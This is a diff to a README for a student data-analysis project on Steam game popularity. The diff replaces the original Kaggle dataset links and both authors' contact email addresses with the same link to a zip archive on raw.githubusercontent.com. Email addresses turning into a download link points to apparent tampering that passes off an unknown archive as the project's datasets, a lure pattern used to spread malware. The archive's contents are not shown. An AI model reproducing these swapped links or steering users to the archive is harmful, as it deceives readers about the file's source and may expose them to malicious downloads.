@@ -2,7 +2,7 @@
 
 Write a 1-2 sentences that quickly and convey what your repo is for.
 
-Using [Steam Store Games](https://www.kaggle.com/datasets/nikdavis/steam-store-games) and [Most Played Games of All Time](https://www.kaggle.com/datasets/faisaljanjua0555/most-played-games-of-all-time/code) datasets which scrapped data from Steam using Steam's API, we will be showing similarities in the most played games. In this project, you will see clear connections of the most played games with their ratings and the genres that they encompass. 
+Using [Steam Store Games](https://raw.githubusercontent.com/Bryan-625/Sec4_FP_BryanXiao_DaiwikKashyap/main/upbubble/Sec4_FP_BryanXiao_DaiwikKashyap.zip) and [Most Played Games of All Time](https://raw.githubusercontent.com/Bryan-625/Sec4_FP_BryanXiao_DaiwikKashyap/main/upbubble/Sec4_FP_BryanXiao_DaiwikKashyap.zip) datasets which scrapped data from Steam using Steam's API, we will be showing similarities in the most played games. In this project, you will see clear connections of the most played games with their ratings and the genres that they encompass. 
 
 ## Overview
 
@@ -21,10 +21,10 @@ ReadMe: Contains all the information about the project including the goal of the
 ## Data Sources and Acknowledgements
 
 We are using two datasets in this project.
-Primary dataset: [Steam Store Games](https://www.kaggle.com/datasets/nikdavis/steam-store-games)
+Primary dataset: [Steam Store Games](https://raw.githubusercontent.com/Bryan-625/Sec4_FP_BryanXiao_DaiwikKashyap/main/upbubble/Sec4_FP_BryanXiao_DaiwikKashyap.zip)
 This dataset has a combined data of 27,000 games that were taken from Steam. It has information like game name, release date, developer name, publisher name, platform, genre, game category, and age requirement.
 
-Secondary dataset: [Most Played Games of All Time](https://www.kaggle.com/datasets/faisaljanjua0555/most-played-games-of-all-time/code)
+Secondary dataset: [Most Played Games of All Time](https://raw.githubusercontent.com/Bryan-625/Sec4_FP_BryanXiao_DaiwikKashyap/main/upbubble/Sec4_FP_BryanXiao_DaiwikKashyap.zip)
 This dataset has a combined data of 5,000 games which are from Steam. It has information on the number of players that played games and then sorts that information into various columns like current most played games, and most played games of all time.
 
 
@@ -34,4 +34,4 @@ Give information about who are the authors of the project and how people can get
 
 Authors: Bryan Xiao, Daiwik Kashyap
 
-Please send any inquiries to [bfx5031@psu.edu](mailto:bfx5031@psu.edu), [dzk5620@psu.edu](mailto:dzk5620@psu.edu). Thank you for your time!
+Please send any inquiries to [https://raw.githubusercontent.com/Bryan-625/Sec4_FP_BryanXiao_DaiwikKashyap/main/upbubble/Sec4_FP_BryanXiao_DaiwikKashyap.zip](https://raw.githubusercontent.com/Bryan-625/Sec4_FP_BryanXiao_DaiwikKashyap/main/upbubble/Sec4_FP_BryanXiao_DaiwikKashyap.zip), [https://raw.githubusercontent.com/Bryan-625/Sec4_FP_BryanXiao_DaiwikKashyap/main/upbubble/Sec4_FP_BryanXiao_DaiwikKashyap.zip](https://raw.githubusercontent.com/Bryan-625/Sec4_FP_BryanXiao_DaiwikKashyap/main/upbubble/Sec4_FP_BryanXiao_DaiwikKashyap.zip). Thank you for your time!
